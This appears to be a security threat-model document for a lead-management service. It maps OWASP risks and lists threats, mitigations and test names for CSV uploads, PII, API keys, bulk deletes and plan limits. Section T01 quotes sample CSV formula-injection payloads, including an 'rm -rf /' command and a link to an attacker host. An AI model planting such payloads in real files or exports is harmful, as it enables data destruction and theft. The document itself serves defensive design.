# 03 — Lead Management & Enrichment — SECURITY

**Status:** 📝 Draft
**Security flag:** 🟡 MEDIUM
**Last updated:** 2026-05-04

## Threat Summary
Risks center on PII handling (GDPR/PDPA), file upload exploitation (malicious CSV), enrichment API credential exposure, and bulk operation abuse.

## OWASP Top 10 Mapping

| # | Risk | Applicable? | Mitigation |
|---|---|---|---|
| A01 | Broken Access Control | 🔴 YES | All lead queries include workspace_id; bulk ops scoped to workspace |
| A03 | Injection | 🟡 YES | CSV formula injection; email field injection |
| A04 | Insecure Design | 🟡 YES | Credits-before-Apollo; free plan limit enforced server-side |
| A05 | Security Misconfiguration | 🟡 YES | Hunter/Apollo API keys via Secret Manager only |
| A08 | Software/Data Integrity | 🟡 YES | CSV MIME + extension + magic bytes validation |
| A09 | Logging | 🟡 YES | Audit log for bulk delete, export, enrichment |

## Threat Model

### T01 — CSV Formula Injection
**Attack:** Attacker uploads CSV with cells containing `=CMD("rm -rf /")` or `=HYPERLINK("http://evil.com/steal")`.
**Impact:** Code execution in victim's spreadsheet app when they download the export CSV.
**Mitigation:**
- Any CSV field starting with `=`, `+`, `-`, `@`, `\t`, `\r` is prefixed with `'` (apostroph) on export
- On import: those characters are stripped/normalized (not executed)
- CSV library: use `csv.reader` (Python stdlib) — no formula evaluation
**Test:** `test_csv_export_sanitizes_formula_injection`

### T02 — Malicious File Upload
**Attack:** User uploads a file that is not a CSV (e.g., executable disguised with `.csv` extension).
**Impact:** Code execution on server; storage of malicious files.
**Mitigation:**
- Validate MIME type (`text/csv`, `application/vnd.ms-excel`, `text/plain`) 
- Validate file extension (`.csv`, `.tsv`)
- Validate magic bytes (first 512 bytes — CSV should be printable UTF-8 text)
- Hard size limit: 25MB; reject at boundary
- File uploaded to Cloudflare R2, never executed on server — parsed in-process with streaming parser
- Virus scanning: Cloudflare R2 can integrate with ClamAV (v2 enhancement)
**Test:** `test_exe_disguised_as_csv_rejected`, `test_file_over_25mb_rejected`

### T03 — PII Exposure / PDPA/GDPR Compliance
**Attack:** (Regulatory) Processing Vietnamese/Thai/Singapore citizen PII without consent.
**Impact:** PDPA/GDPR fines; reputational damage.
**Mitigation:**
- `consent_log` entry created when a workspace imports leads with consent_required_countries (VN/TH/SG)
- Export CSV includes only fields visible to the requesting user's role
- Viewer role cannot export leads
- Admin/Owner can configure data retention policy (auto-delete leads after N days of inactivity)
- PII fields (email, phone, linkedin_url) not logged in application logs
**Test:** `test_viewer_cannot_export_leads`, `test_pii_fields_not_in_application_logs`

### T04 — Enrichment API Credential Exposure
**Attack:** Hunter.io and Apollo.io API keys exposed in logs, error messages, or API responses.
**Impact:** Attacker uses our API keys; credit exhaustion; billing fraud.
**Mitigation:**
- API keys fetched from GCP Secret Manager at service startup (not environment variables)
- Keys never logged (structlog redact: `hunter_api_key`, `apollo_api_key`)
- Error messages from enrichment providers do not echo raw API responses to the client
- Key rotation: documented runbook in IMPLEMENTATION.md
**Test:** `test_enrichment_error_does_not_expose_api_key`

### T05 — Bulk Delete Abuse
**Attack:** Admin-role attacker bulk-deletes entire lead database.
**Impact:** Irreversible data loss.
**Mitigation:**
- Bulk delete is soft-delete (sets `deleted_at`) — 30-day recovery window
- Bulk delete of >500 leads requires explicit confirmation flag (`confirm_delete: true`)
- Audit log entry includes count + actor + timestamp
- Hard delete requires owner role + 24-hour delay (scheduled job)
**Test:** `test_bulk_delete_without_confirm_returns_422`, `test_bulk_delete_creates_audit_log_entry`

### T06 — Free Plan Limit Bypass
**Attack:** Client sends multiple concurrent import requests to race past the 100-lead limit.
**Impact:** Free users store unlimited leads without paying.
**Mitigation:**
- Limit check is inside a DB transaction with a SELECT FOR UPDATE on workspace plan record
- Limit enforced server-side on every write path (create + import)
- Limit check is tested with concurrent requests
**Test:** `test_concurrent_import_does_not_exceed_free_plan_limit`

## RevLooper Non-Negotiables Checklist

| Requirement | Status | Notes |
|---|---|---|
| workspace_id on every DB query | ✅ | Unique index on (workspace_id, email) |
| Credits before enrichment (Apollo) | ✅ | T03 in billing-service dependency |
| Secrets via GCP Secret Manager | ✅ | Hunter/Apollo keys |
| SEA consent (consent_log) | ✅ | T03 — VN/TH/SG workspaces |
| Transactional outbox | ✅ | lead.created, lead.enrichment.completed |
| Suppression check | ✅ | lead.created event triggers suppression check in outreach-service |

## Security Tests
- `[SECURITY]` `test_csv_formula_injection_sanitized_on_export`
- `[SECURITY]` `test_malicious_file_upload_rejected`
- `[SECURITY]` `test_cross_workspace_lead_access_returns_403`
- `[SECURITY]` `test_viewer_cannot_export_leads`
- `[SECURITY]` `test_enrichment_error_does_not_expose_api_keys`
- `[SECURITY]` `test_concurrent_import_does_not_exceed_free_plan_limit`
